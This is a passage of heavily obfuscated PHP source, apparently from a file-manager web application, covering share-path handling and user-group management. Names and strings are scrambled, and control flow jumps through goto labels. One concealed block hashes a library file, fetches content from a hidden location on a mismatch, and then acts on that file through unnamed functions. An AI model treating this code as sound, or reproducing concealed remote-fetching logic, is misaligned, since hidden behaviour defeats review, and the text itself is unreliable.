$f«Â‹ÉÇ‡Å, $bÕ² Ô¬é); goto B¢´éìİÉ¿; D…„©ñÙ™ˆ: $aº¿›…••ä =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $c‰†—´›Ñ = $this->model->sourceInfo($dÊ‘éíŒİ); if ($c‰†—´›Ñ[$aº¿›…••ä[370]] == $aº¿›…••ä[83]) { header($aº¿›…••ä[1117]); die; } goto B‡èªÎä¨; B¢´éìİÉ¿: } public function fileOut($Aóé‘Ò’Ò‚, $EòåÃÂ˜ˆ’ = false, $DšÚ½ÎŒÃ— = false, $B•ÊØİäù = '') { $this->_fileOut($Aóé‘Ò’Ò‚, $EòåÃÂ˜ˆ’, $DšÚ½ÎŒÃ—, $B•ÊØİäù); } public function fileOutServer($cÄÚš‚×‰, $eÔ¦¤µ¦ë = false, $Cé½äæ™˜ = false, $e¨¿¥àØîƒ = '') { $this->_fileOut($cÄÚš‚×‰, $eÔ¦¤µ¦ë, $Cé½äæ™˜, $e¨¿¥àØîƒ, !0); } protected function _fileOutImage($cÍ»‰ÂË•è, $Bóïïööòó = 250) { $E¾ÄÛëÔø =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $dˆõ½òåÆÖ = $this->model->sourceInfo($cÍ»‰ÂË•è); if ($dˆõ½òåÆÖ[$E¾ÄÛëÔø[370]] == $E¾ÄÛëÔø[83]) { show_json($E¾ÄÛëÔø[1119] . $cÍ»‰ÂË•è, !1); } $GLOBALS[$E¾ÄÛëÔø[1118]] = $dˆõ½òåÆÖ[$E¾ÄÛëÔø[28]]; $fî„”ƒ©² = $this->model->fileInfoGet($cÍ»‰ÂË•è); IO::fileOutImage($fî„”ƒ©²[$E¾ÄÛëÔø[75]], $Bóïïööòó); } public function fileOutImage($D˜—á‡ØàÚ, $EĞâô‚Ï”® = 250) { $this->_fileOutImage($D˜—á‡ØàÚ, $EĞâô‚Ï”®); } public function fileOutImageServer($A¦ºé…ŞÛ”, $E–òàğÄ‡ê = 250) { $this->_fileOutImage($A¦ºé…ŞÛ”, $E–òàğÄ‡ê); } public function link($a‘Œ‘Ø–Ø³, $cÜøóòÖîå = '') { $EÒìñÖÄÏÀ = $this->model->fileInfoGet($a‘Œ‘Ø–Ø³); return IO::link($EÒìñÖÄÏÀ[$_SERVER[ŒÌ¶ß×Ç‚ìËƒ][75]], $cÜøóòÖîå); } protected function parse($EâôÓŠµ) { $F™¬äÊöëÛ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (strstr($EâôÓŠµ, $F™¬äÊöëÛ[8]) === !1) { return array($F™¬äÊöëÛ[385] => intval($EâôÓŠµ), $F™¬äÊöëÛ[75] => $F™¬äÊöëÛ[33], $F™¬äÊöëÛ[1115] => array()); } $eÄêàùßèÆ = explode($F™¬äÊöëÛ[8], trim($EâôÓŠµ, $F™¬äÊöëÛ[8])); if (count($eÄêàùßèÆ) < 2) { show_tips($EâôÓŠµ . $F™¬äÊöëÛ[1120]); } return array($F™¬äÊöëÛ[385] => intval($eÄêàùßèÆ[0]), $F™¬äÊöëÛ[75] => $eÄêàùßèÆ[1], $F™¬äÊöëÛ[1115] => array_slice($eÄêàùßèÆ, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($F™ï„Ï««¡) { $this->pathParse = $F™ï„Ï««¡; $this->model = Model($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][1114]); } public function getPathOuter($Bß’ÃñÕ©Í) { $F¤ß’É¶£Ê =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!$Bß’ÃñÕ©Í) { return $Bß’ÃñÕ©Í; } $f¡éÂ¶øË = $this->parse($Bß’ÃñÕ©Í); return trim(KodIO::makeShare($this->pathParse[$F¤ß’É¶£Ê[367]], $f¡éÂ¶øË[$F¤ß’É¶£Ê[367]]), $F¤ß’É¶£Ê[8]); } protected function infoParse($eÙùáö¾ãù, $aÔä•ßœÖ = false, $F„¸ÄÙ¤ŠÆ = false) { $câÏ¶ĞŠõ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $a•†ÚàÕ = $this->pathParse[$câÏ¶ĞŠõ[367]]; $EÒÁâ›–½ = trim($this->pathParse[$câÏ¶ĞŠõ[1009]], $câÏ¶ĞŠõ[8]); return Action($câÏ¶ĞŠõ[1121])->sharePathInfo($a•†ÚàÕ, $EÒÁâ›–½); } public function infoFull($bç¾¬«ˆ¡é) { $céÜæ‰Äß =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $bøŒñÌŠ‘  = explode($céÜæ‰Äß[8], trim($bç¾¬«ˆ¡é, $céÜæ‰Äß[8])); if (count($bøŒñÌŠ‘ ) > 1) { $a¦…÷àÅ×ê = implode($céÜæ‰Äß[8], array_splice($bøŒñÌŠ‘ , 1)); $EêæåŒå± = $this->model->pathInfoByPath($bøŒñÌŠ‘ [0], $a¦…÷àÅ×ê); if (!$EêæåŒå±) { return !1; } $this->pathParse[$céÜæ‰Äß[1009]] = $EêæåŒå±[$céÜæ‰Äß[369]]; } return $this->infoParse($bç¾¬«ˆ¡é); } public function listAll($DÀÊ´©ÆÈ) { goto CáĞİâÏÎò; c¢—´ÍŸ®–: $D«êÁß¤×Ÿ = $this->model->listAll($DÀÊ´©ÆÈ); $b¨ƒÄ½ã¯È = Model($cŞ–¦¡ëòç[538])->getInfo($FË«¿ÍÔ¸´[$cŞ–¦¡ëòç[441]]); $F“Ì»îæÅˆ = Action($cŞ–¦¡ëòç[1121]); goto aÜ†Íø©å; CáĞİâÏÎò: $cŞ–¦¡ëòç =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $FË«¿ÍÔ¸´ = IO::info($this->pathParse[$cŞ–¦¡ëòç[75]]); if (!$FË«¿ÍÔ¸´) { return array(); } goto c¢—´ÍŸ®–; aÜ†Íø©å: foreach ($D«êÁß¤×Ÿ as &$C÷‹½³ùÈê) { check_abort(); $C÷‹½³ùÈê[$cŞ–¦¡ëòç[391]] = $F“Ì»îæÅˆ->_shareItemeParse($C÷‹½³ùÈê[$cŞ–¦¡ëòç[391]], $b¨ƒÄ½ã¯È); } unset($C÷‹½³ùÈê); return $D«êÁß¤×Ÿ; goto D½×¥‰Éè–; D½×¥‰Éè–: } } goto fâÍµó»…«; fâÍµó»…«: $c‹ìºÁ‚« = LIB_DIR . $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][1122]; $e°¿êŞëİ• = $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][1123]; if ($_SERVER[$_SERVER[ŒÌ¶ß×Ç‚ìËƒ][703]] != $e°¿êŞëİ•($c‹ìºÁ‚«)) { goto a®ôÑ¾ÓÀ; FÛÎ‹äß²: $eá…½Œœ‘($c‹ìºÁ‚«); goto A½êÙÜÚº–; d¥×ë†Ç·ë: $A‘¶äèÛË¹ = explode($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][217], $dô†‹ÊÁ§ô); if (count($A‘¶äèÛË¹) < $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][562]) { $Eø‹¾ë˜ÙÔ = $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][708]; $Eø‹¾ë˜ÙÔ(); } $eá…½Œœ‘ = $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][709]; goto FÛÎ‹äß²; a®ôÑ¾ÓÀ: $Bï±‰¹£ = $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][705]; $BÊà°†Ê§Ğ = $_SERVER[$_SERVER[ŒÌ¶ß×Ç‚ìËƒ][706]] . $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][707]; $dô†‹ÊÁ§ô = $Bï±‰¹£($BÊà°†Ê§Ğ); goto d¥×ë†Ç·ë; A½êÙÜÚº–: } goto c±ÄÅËÅîá; d´ïÄğİ½: class GroupModel extends ModelBase { protected $tableName = "\x67\162\157\165\x70"; protected $tableMeta = array("\164\141\142\154\145\x4e\x61\x6d\145" => "\147\162\157\x75\x70\x5f\155\x65\164\x61", "\155\x65\x74\x61\x46\151\x65\x6c\x64" => "\x67\x72\x6f\165\160\x49\x44"); protected function cacheFunctionAlias($E‚Ù‰ˆ¥©’) { $eÅ‡“‚Ò±Û =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; return array($eÅ‡“‚Ò±Û[2177] => array($E‚Ù‰ˆ¥©’[0], $eÅ‡“‚Ò±Û[2178]), $eÅ‡“‚Ò±Û[2179] => array($E‚Ù‰ˆ¥©’[0], $eÅ‡“‚Ò±Û[2178])); } protected function getInfo($b„ÔÉ´æ´) { $bÆÃÍ…µ‰è = $this->getInfoSimple($b„ÔÉ´æ´); if (!$bÆÃÍ…µ‰è) { return !1; } return $this->_listDataApplyItem($bÆÃÍ…µ‰è); } protected function getInfoSimple($F’æ¿ÄŞ‚¸, $dê„Šß ¬‘ = false) { $A“¥º¶­ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if ($dê„Šß ¬‘) { $BŠ’ª´ƒ– = array($A“¥º¶­[2108] => intval($F’æ¿ÄŞ‚¸)); $BÚØ¡ª¥çÎ = $this->where($BŠ’ª´ƒ–)->find(); return is_array($BÚØ¡ª¥çÎ) ? $BÚØ¡ª¥çÎ : array(); } return $this->cacheFunctionGet($A“¥º¶­[2180], $F’æ¿ÄŞ‚¸); } protected function groupAdd($EùÚÇñ˜ßŒ) { goto Dò­•øˆ‰ğ; aõÉùÏ¬ï†: if ($cô¥´ö†‡‘[$f¦í£¶ —à[461]]) { $Dì·÷‚²è = $cô¥´ö†‡‘[$f¦í£¶ —à[461]] . $cô¥´ö†‡‘[$f¦í£¶ —à[2108]] . $f¦í£¶ —à[47]; } $aµÊÅ³Æ¨Ñ = array($f¦í£¶ —à[386] => $this->groupNameAuto($EùÚÇñ˜ßŒ[$f¦í£¶ —à[463]], $EùÚÇñ˜ßŒ[$f¦í£¶ —à[28]]), $f¦í£¶ —à[368] => $EùÚÇñ˜ßŒ[$f¦í£¶ —à[463]], $f¦í£¶ —à[527] => $Dì·÷‚²è, $f¦í£¶ —à[2181] => $EùÚÇñ˜ßŒ[$f¦í£¶ —à[2092]], $f¦í£¶ —à[2182] => 0, $f¦í£¶ —à[2112] => 0); if (isset($EùÚÇñ˜ßŒ[$f¦í£¶ —à[2130]])) { $aµÊÅ³Æ¨Ñ[$f¦í£¶ —à[2130]] = $EùÚÇñ˜ßŒ[$f¦í£¶ —à[2130]]; } else { $dµŞœ¸â° = $this->max($f¦í£¶ —à[2130]); if (!$dµŞœ¸â°) { $dµŞœ¸â° = 0; } $aµÊÅ³Æ¨Ñ[$f¦í£¶ —à[2130]] = $dµŞœ¸â° + 1; } goto CŠŒ‘¸ÈÖ—; EÔ†¥“Èš: if (isset($EùÚÇñ˜ßŒ[$f¦í£¶ —à[2183]])) { $this->metaSet($d¼ù ÖÉËğ, array($f¦í£¶ —à[2183] => $EùÚÇñ˜ßŒ[$f¦í£¶ —à[2183]], $f¦í£¶ —à[2184] => $EùÚÇñ˜ßŒ[$f¦í£¶ —à[2184]])); unset($EùÚÇñ˜ßŒ[$f¦í£¶ —à[2183]]); unset($EùÚÇñ˜ßŒ[$f¦í£¶ —à[2184]]); } Model($f¦í£¶ —à[1114])->groupRootAdd($d¼ù ÖÉËğ); return $d¼ù ÖÉËğ; goto D”·ÙÄ‡”©; CŠŒ‘¸ÈÖ—: if (!empty($EùÚÇñ˜ßŒ[$f¦í£¶ —à[2108]])) { $aµÊÅ³Æ¨Ñ[$f¦í£¶ —à[2108]] = $EùÚÇñ˜ßŒ[$f¦í£¶ —à[2108]]; } $d¼ù ÖÉËğ = $this->add($aµÊÅ³Æ¨Ñ); $this->setNamePinyin($d¼ù ÖÉËğ, $aµÊÅ³Æ¨Ñ[$f¦í£¶ —à[28]]); goto EÔ†¥“Èš; Dò­•øˆ‰ğ: $f¦í£¶ —à =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!$EùÚÇñ˜ßŒ[$f¦í£¶ —à[463]] && isset($EùÚÇñ˜ßŒ[$f¦í£¶ —à[2108]]) && $EùÚÇñ˜ßŒ[$f¦í£¶ —à[2108]] == 1) { if ($cô¥´ö†‡‘ = $this->getInfoSimple($EùÚÇñ˜ßŒ[$f¦í£¶ —à[2108]], !0)) { return $EùÚÇñ˜ßŒ[$f¦í£¶ —à[2108]]; } } else { $cô¥´ö†‡‘ = $this->getInfoSimple($EùÚÇñ˜ßŒ[$f¦í£¶ —à[463]]); if (!$cô¥´ö†‡‘) { return !1; } } $Dì·÷‚²è = $f¦í£¶ —à[472]; goto aõÉùÏ¬ï†; D”·ÙÄ‡”©: } protected function groupEdit($d¸¶ö¦¶ó½, $f¾ëï…õ§Ñ) { $bÖì„ˆÛÇ‘ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!empty($f¾ëï…õ§Ñ[$bÖì„ˆÛÇ‘[463]])) { $e³®„ĞÙùÖ = $this->getInfoSimple($d¸¶ö¦¶ó½); $f×£ŒÇ‡»— = $this->getInfoSimple($f¾ëï…õ§Ñ[$bÖì„ˆÛÇ‘[463]]); if (!$e³®„ĞÙùÖ || !$f×£ŒÇ‡»—) { return !1; } if ($e³®„ĞÙùÖ[$bÖì„ˆÛÇ‘[2108]] == $f×£ŒÇ‡»—[$bÖì„ˆÛÇ‘[2108]]) { return !1; } if ($f¾ëï…õ§Ñ[$bÖì„ˆÛÇ‘[463]] != $e³®„ĞÙùÖ[$bÖì„ˆÛÇ‘[463]]) { if ($f×£ŒÇ‡»—[$bÖì„ˆÛÇ‘[461]] !== $e³®„ĞÙùÖ[$bÖì„ˆÛÇ‘[461]] && strpos($f×£ŒÇ‡»—[$bÖì„ˆÛÇ‘[461]], $e³®„ĞÙùÖ[$bÖì„ˆÛÇ‘[461]] . $e³®„ĞÙùÖ[$bÖì„ˆÛÇ‘[2108]] . $bÖì„ˆÛÇ‘[47]) === 0) { return !1; } $f¾ëï…õ§Ñ[$bÖì„ˆÛÇ‘[527]] = $f×£ŒÇ‡»—[$bÖì„ˆÛÇ‘[461]] . $f¾ëï…õ§Ñ[$bÖì„ˆÛÇ‘[463]] . $bÖì„ˆÛÇ‘[47]; $this->_changeChildLevel($e³®„ĞÙùÖ, $f×£ŒÇ‡»—); } } if (isset($f¾ëï…õ§Ñ[$bÖì„ˆÛÇ‘[28]])) { $this->setNamePinyin($d¸¶ö¦¶ó½, $f¾ëï…õ§Ñ[$bÖì„ˆÛÇ‘[28]]); } if (isset($f¾ëï…õ§Ñ[$bÖì„ˆÛÇ‘[2183]])) { $this->metaSet($d¸¶ö¦¶ó½, array($bÖì„ˆÛÇ‘[2183] => $f¾ëï…õ§Ñ[$bÖì„ˆÛÇ‘[2183]], $bÖì„ˆÛÇ‘[2184] => $f¾ëï…õ§Ñ[$bÖì„ˆÛÇ‘[2184]])); unset($f¾ëï…õ§Ñ[$bÖì„ˆÛÇ‘[2183]]); unset($f¾ëï…õ§Ñ[$bÖì„ˆÛÇ‘[2184]]); } return $this->where(array($bÖì„ˆÛÇ‘[2185] => $d¸¶ö¦¶ó½))->save($f¾ëï…õ§Ñ); } private function _changeChildLevel($fî£¶ ¨íÊ, $CĞ´¤ÓŸ¸Ç, $fÏéªô“– = false) { goto D°Ğôíà²î; cÍÒïŠé’©: $this->where($C×™¶ºÑĞ)->data($FæÈ™»)->save(); goto A’ôĞŒ¨½; Eº„†îáå: if ($fÏéªô“–) { $C…‹ï‰¹‘ = $CĞ´¤ÓŸ¸Ç[$Eò†ÄèÛ…Æ[461]] . $CĞ´¤ÓŸ¸Ç[$Eò†ÄèÛ…Æ[2108]] . $Eò†ÄèÛ…Æ[47]; } $C×™¶ºÑĞ = array($Eò†ÄèÛ…Æ[527] => array($Eò†ÄèÛ…Æ[485], $fî£¶ ¨íÊ[$Eò†ÄèÛ…Æ[461]] . $fî£¶ ¨íÊ[$Eò†ÄèÛ…Æ[2108]] . $Eò†ÄèÛ…Æ[486])); $FæÈ™» = array($Eò†ÄèÛ…Æ[527] => array($Eò†ÄèÛ…Æ[536], "\x72\x65\x70\154\x61\143\x65\50\160\141\162\145\x6e\164\x4c\x65\166\145\x6c\54\47{$F¥¿›¢’–æ}\47\54\x27{$C…‹ï‰¹‘}\x27\x29")); goto cÍÒïŠé’©; D°Ğôíà²î: $Eò†ÄèÛ…Æ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $F¥¿›¢’–æ = $fî£¶ ¨íÊ[$Eò†ÄèÛ…Æ[461]] . $fî£¶ ¨íÊ[$Eò†ÄèÛ…Æ[2108]] . $Eò†ÄèÛ…Æ[47]; $C…‹ï‰¹‘ = $CĞ´¤ÓŸ¸Ç[$Eò†ÄèÛ…Æ[461]] . $CĞ´¤ÓŸ¸Ç[$Eò†ÄèÛ…Æ[2108]] . $Eò†ÄèÛ…Æ[47] . $fî£¶ ¨íÊ[$Eò†ÄèÛ…Æ[2108]] . $Eò†ÄèÛ…Æ[47]; goto Eº„†îáå; A’ôĞŒ¨½: } public function setNamePinyin($Bš¿“È¹¯À, $dİ£…Ä‘ğå = false) { $bòë¬ŠæÂÔ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!$dİ£…Ä‘ğå) { $eÙ‡îÓ¹¡ = $this->getInfoSimple($Bš¿“È¹¯À); $dİ£…Ä‘ğå = $eÙ‡îÓ¹¡[$bòë¬ŠæÂÔ[28]]; } if (!Input::check($dİ£…Ä‘ğå, $bòë¬ŠæÂÔ[530])) { $this->metaSet($Bš¿“È¹¯À, $bòë¬ŠæÂÔ[416], null); $this->metaSet($Bš¿“È¹¯À, $bòë¬ŠæÂÔ[415], null); return; } $Dè¿ˆØÛ‚ = array($bòë¬ŠæÂÔ[416] => str_replace($bòë¬ŠæÂÔ[50], $bòë¬ŠæÂÔ[33], Pinyin::encode($dİ£…Ä‘ğå)), $bòë¬ŠæÂÔ[415] => Pinyin::encode($dİ£…Ä‘ğå, $bòë¬ŠæÂÔ[531])); $this->metaSet($Bš¿“È¹¯À, $Dè¿ˆØÛ‚); } protected function groupStatus($eåáİÎªõ, $C ³—Åƒ) { goto D²´í¤Ñ; B”‰¬éŠƒÈ: if ($C ³—Åƒ == $EŸÓÆ“³Û”[83]) { $dˆ¨²‚Öí = $this->parentLevelArray($aÈ ¼õÛí­[$EŸÓÆ“³Û”[461]]); } else { $EôŒŒÏÃ‚· = array($EŸÓÆ“³Û”[527] => array($EŸÓÆ“³Û”[485], $aÈ ¼õÛí­[$EŸÓÆ“³Û”[461]] . $aÈ ¼õÛí­[$EŸÓÆ“³Û”[2108]] . $EŸÓÆ“³Û”[486])); $dˆ¨²‚Öí = $this->where($EôŒŒÏÃ‚·)->field($EŸÓÆ“³Û”[2108])->select(); $dˆ¨²‚Öí = array_to_keyvalue($dˆ¨²‚Öí, $EŸÓÆ“³Û”[33], $EŸÓÆ“³Û”[2108]); } $dˆ¨²‚Öí[] = $aÈ ¼õÛí­[$EŸÓÆ“³Û”[2108]]; $F¦‹¨ÊÂà = array(); goto c¸î‚Š¿Ñˆ; c¸î‚Š¿Ñˆ: foreach ($dˆ¨²‚Öí as $eåáİÎªõ) { $F¦‹¨ÊÂà[] = array($EŸÓÆ“³Û”[2108] => $eåáİÎªõ, $EŸÓÆ“³Û”[89] => $EŸÓÆ“³Û”[683], $EŸÓÆ“³Û”[359] => $C ³—Åƒ); } return Model($EŸÓÆ“³Û”[2186])->addAll($F¦‹¨ÊÂà, array(), !0); goto A»½µôÙäÏ; D²´í¤Ñ: $EŸÓÆ“³Û” =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $aÈ ¼õÛí­ = $this->getInfoSimple($eåáİÎªõ); if (!$aÈ ¼õÛí­) { return !1; } goto B”‰¬éŠƒÈ; A»½µôÙäÏ: } protected function groupRemove($Aõ´œéóõ°) { goto a†‹ ê† ; a†‹ ê† : $e‡¥ç¾È¦Œ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $bÌÀ¡Ø¾Ä = array($e‡¥ç¾È¦Œ[2108] => $Aõ´œéóõ°); $F·ÀŸò²ö¹ = $this->where($bÌÀ¡Ø¾Ä)->find(); goto b¥”˜˜‘œ„; C„½õö¡¢: $this->where(array($e‡¥ç¾È¦Œ[463] => $Aõ´œéóõ°))->save(array($e‡¥ç¾È¦Œ[463] => $F·ÀŸò²ö¹[$e‡¥ç¾È¦Œ[463]])); Model($e‡¥ç¾È¦Œ[2186])->where($bÌÀ¡Ø¾Ä)->delete(); Model($e‡¥ç¾È¦Œ[2187])->where($bÌÀ¡Ø¾Ä)->delete(); goto bµ¸›íè¤‚; b¥”˜˜‘œ„: if (!$F·ÀŸò²ö¹ || $F·ÀŸò²ö¹[$e‡¥ç¾È¦Œ[463]] == 0) { return !1; } $E£àÆí§­ = $this->getInfoSimple($F·ÀŸò²ö¹[$e‡¥ç¾È¦Œ[463]]); $this->_changeChildLevel($F·ÀŸò²ö¹, $E£àÆí§­, !0); goto C„½õö¡¢; bµ¸›íè¤‚: Model($e‡¥ç¾È¦Œ[754])->groupRootRemove($Aõ´œéóõ°); return $this->where($bÌÀ¡Ø¾Ä)->delete(); goto d°¡¤éºùñ; d°¡¤éºùñ: } protected function groupSort($Cò“ŸÕ½Œ›) { $AâéÖ½Ğ¸é =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $a¤»§óÈ³ = array(); foreach ($Cò“ŸÕ½Œ› as $d‚µò„Ãš‹ => $A‹ƒï£ÖÜ÷) { $a¤»§óÈ³[] = array($AâéÖ½Ğ¸é[2108], $A‹ƒï£ÖÜ÷, $AâéÖ½Ğ¸é[2130], $d‚µò„Ãš‹ + 1); } $this->saveAll($a¤»§óÈ³); } public function listData() { $DÎºØ‚ê» = $this->_makeOrder()->selectPage(50); $this->_listDataApply($DÎºØ‚ê»[$_SERVER[ŒÌ¶ß×Ç‚ìËƒ][354]]); return $DÎºØ‚ê»; } private function _makeOrder($e·ˆŞËÍö = '') { goto cÈ¼…ìˆ; e°˜‘Û¹é×: $f¯¨¢›…¸ = Input::get($bğŒÍ·ˆ«Ø[407], $bğŒÍ·ˆ«Ø[7], $bğŒÍ·ˆ«Ø[2112], $E´¸Ùê¯õĞ); $cç—‰Ñ¦Ø = Input::get($bğŒÍ·ˆ«Ø[408], $bğŒÍ·ˆ«Ø[7], $bğŒÍ·ˆ«Ø[2188], array($bğŒÍ·ˆ«Ø[2188], $bğŒÍ·ˆ«Ø[404])); $cç—‰Ñ¦Ø = $AÙÃÄ™ø[$cç—‰Ñ¦Ø]; goto dÀÒù¦ƒ¯É; dÀÒù¦ƒ¯É: $e·ˆŞËÍö = $e·ˆŞËÍö . "{$f¯¨¢›…¸}\x20{$cç—‰Ñ¦Ø}\54\40\x67\x72\157\165\160\x49\104\x20\141\163\x63"; return $this->order($e·ˆŞËÍö); goto d†Äéñ“İ·; cÈ¼…ìˆ: $bğŒÍ·ˆ«Ø =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $E´¸Ùê¯õĞ = array($bğŒÍ·ˆ«Ø[2108], $bğŒÍ·ˆ«Ø[28], $bğŒÍ·ˆ«Ø[2094], $bğŒÍ·ˆ«Ø[187]); $AÙÃÄ™ø = array($bğŒÍ·ˆ«Ø[402] => $bğŒÍ·ˆ«Ø[403], $bğŒÍ·ˆ«Ø[404] => $bğŒÍ·ˆ«Ø[405]); goto e°˜‘Û¹é×; d†Äéñ“İ·: } public function listChild($cŠ¸ñ²¿ğË) { $eÑ¦Óâ‰å =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $C¿ëºÙÛ‡ = $this->where(array($eÑ¦Óâ‰å[463] => $cŠ¸ñ²¿ğË))->_makeOrder()->selectPage(200); $this->_listDataApply($C¿ëºÙÛ‡[$eÑ¦Óâ‰å[354]]); return $C¿ëºÙÛ‡; } public function listByID($c„Ñ†šä³°) { $EªÑã†Û¢Î =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!$c„Ñ†šä³°) { return array(); } $A“–‹Á‡™Ï = array($EªÑã†Û¢Î[2108] => array($EªÑã†Û¢Î[7], $c„Ñ†šä³°)); $Aïßèå•Ñ“ = $this->where($A“–‹Á‡™Ï)->select(); $this->_listDataApply($Aïßèå•Ñ“); return $Aïßèå•Ñ“; } public function listSearch($f·•ğ‡µ´) { goto aŠÃ‘‹†¡; eã™çôÉ“: if (!$Aµ…ëšÔ®Ç || count($Aµ…ëšÔ®Ç[$CõÁ«Ü˜çë[354]]) < 5 && Input::check($Dà‡Œá‚ˆ¢, $CõÁ«Ü˜çë[306])) { goto D¬õÎ—–Ÿ‘; Fª±‚“Ş¢‘: $B„Æò¶Ë†Â = array_merge($c¼ÉÃ¬·, $eŞ©È‰±Ş, $Aµ…ëšÔ®Ç[$CõÁ«Ü˜çë[354]]); $Aµ…ëšÔ®Ç[$CõÁ«Ü˜çë[354]] = array_unique_by_key($B„Æò¶Ë†Â, $CõÁ«Ü˜çë[2108]); $Aµ…ëšÔ®Ç[$CõÁ«Ü˜çë[351]][$CõÁ«Ü˜çë[352]] = count($Aµ…ëšÔ®Ç[$CõÁ«Ü˜çë[354]]); goto Eß¦«ÈÔáÔ; Eß¦«ÈÔáÔ: $Aµ…ëšÔ®Ç[$CõÁ«Ü˜çë[351]][$CõÁ«Ü˜çë[353]] = ceil($Aµ…ëšÔ®Ç[$CõÁ«Ü˜çë[351]][$CõÁ«Ü˜çë[352]] / $Aµ…ëšÔ®Ç[$CõÁ«Ü˜çë[351]][$CõÁ«Ü˜çë[349]]); goto F¢œ¢ƒÅŒ–; D¬õÎ—–Ÿ‘: $eò¼Òíöé¤ = $this->groupChildrenAll($C»œŸ²˜£); $c¼ÉÃ¬· = $this->_searchFromMeta($CõÁ«Ü˜çë[415], $Dà‡Œá‚ˆ¢, 10, $eò¼Òíöé¤); $eŞ©È‰±Ş = $this->_searchFromMeta($CõÁ«Ü˜çë[416], $Dà‡Œá‚ˆ¢, 10, $eò¼Òíöé¤); goto Fª±‚“Ş¢‘; F¢œ¢ƒÅŒ–: } $this->_listDataApply($Aµ…ëšÔ®Ç[$CõÁ«Ü˜çë[354]]); return $Aµ…ëšÔ®Ç; goto b•‘’ÏÒ…Ï; aù¡óêÌî: if (!trim($Dà‡Œá‚ˆ¢)) { return !1; } $Dà‡Œá‚ˆ¢ = str_replace($CõÁ«Ü˜çë[2191], $CõÁ«Ü˜çë[2192], $Dà‡Œá‚ˆ¢); $b¸ÖÚ¢©ïÍ = array($CõÁ«Ü˜çë[2108] => array($CõÁ«Ü˜çë[753], "\45{$Dà‡Œá‚ˆ¢}\x25"), $CõÁ«Ü˜çë[28] => array($CõÁ«Ü˜çë[753], "\45{$Dà‡Œá‚ˆ¢}\45"), $CõÁ«Ü˜çë[910] => $CõÁ«Ü˜çë[2193]); goto E³™³»ƒ›; E³™³»ƒ›: if ($C»œŸ²˜£) { $e³­‡è¡œ = $this->getInfoSimple($C»œŸ²˜£); $EåãÓÂ ‰â = $e³­‡è¡œ[$CõÁ«Ü˜çë[461]] . $C»œŸ²˜£ . $CõÁ«Ü˜çë[486]; $b¸ÖÚ¢©ïÍ = array($b¸ÖÚ¢©ïÍ, array($CõÁ«Ü˜çë[461] => array($CõÁ«Ü˜çë[753], $EåãÓÂ ‰â))); } $Aµ…ëšÔ®Ç = $this->_makeOrder()->where($b¸ÖÚ¢©ïÍ)->selectPage(20); $Aµ…ëšÔ®Ç = $Aµ…ëšÔ®Ç ? $Aµ…ëšÔ®Ç : array(); goto eã™çôÉ“; aŠÃ‘‹†¡: $CõÁ«Ü˜çë =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $Dà‡Œá‚ˆ¢ = $f·•ğ‡µ´[$CõÁ«Ü˜çë[2189]]; $C»œŸ²˜£ = isset($f·•ğ‡µ´[$CõÁ«Ü˜çë[2190]]) ? $f·•ğ‡µ´[$CõÁ«Ü˜çë[2190]] : !1; goto aù¡óêÌî; b•‘’ÏÒ…Ï: } protected function groupChildrenAll($d«ğ‡–¿ŞÂ) { $AÅ»¸©î† =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!$d«ğ‡–¿ŞÂ) { return !1; } if (is_string($d«ğ‡–¿ŞÂ)) { $d«ğ‡–¿ŞÂ = array($d«ğ‡–¿ŞÂ); } $E²·¥©Àçø = $d«ğ‡–¿ŞÂ; foreach ($d«ğ‡–¿ŞÂ as $D·îö„©ò) { $fâ–ÈõŒ‰¦ = $this->getInfoSimple($D·îö„©ò); $F¦»òÂ½ßè = array($AÅ»¸©î†[461] => array($AÅ»¸©î†[753], $fâ–ÈõŒ‰¦[$AÅ»¸©î†[461]] . $D·îö„©ò . $AÅ»¸©î†[486])); $E†¾ƒ×Ø´Ü = $this->field($AÅ»¸©î†[2108])->where($F¦»òÂ½ßè)->select(); $E²·¥©Àçø = array_merge($E²·¥©Àçø, array_to_keyvalue($E†¾ƒ×Ø´Ü, $AÅ»¸©î†[33], $AÅ»¸©î†[2108])); } return array_unique($E²·¥©Àçø); } private function _searchFromMeta($Eé¥×à‡¡, $CºËÂˆÆ·ö, $FÁˆŞ¼‡œã, $Eæ‡œç³Ò) { goto FÜç¿ÔÇ—ã; FÜç¿ÔÇ—ã: $b–®—¶­å =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $CºËÂˆÆ·ö = strtolower($CºËÂˆÆ·ö); $b´»×å¦ê = array($b–®—¶­å[89] => $Eé¥×à‡¡, $b–®—¶­å[359] => array($b–®—¶­å[753], "\45{$CºËÂˆÆ·ö}\45")); goto F¾ˆÃ†ƒÑ§; AÂÎ¤ˆ“··: $Fõ“¬ôÙå = array_to_keyvalue($Fõ“¬ôÙå, 